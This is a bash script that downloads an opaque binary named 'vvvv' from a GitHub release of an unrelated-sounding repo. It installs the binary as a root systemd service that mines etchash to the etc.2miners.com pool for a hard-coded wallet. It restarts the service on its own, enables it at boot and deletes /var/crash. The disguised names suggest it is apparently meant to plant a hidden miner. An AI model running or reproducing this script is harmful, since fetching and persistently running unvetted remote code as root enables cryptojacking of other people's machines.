#!/bin/bash

if pgrep -x "vvvv" > /dev/null
then
  echo "dang ton tai"
cd /home  
  
  
else
sudo service racing stop
sudo service gpu1 stop
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/vvvv
sudo chmod +x vvvv
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/vvvv  -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x69d9C862994EE9759ffb0D171AAfDc335f2da312 -p x -w newetc
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&

sudo systemctl daemon-reload &&
sudo systemctl enable gpu1.service &&
sudo service gpu1 stop  &&
sudo service gpu1 restart
fi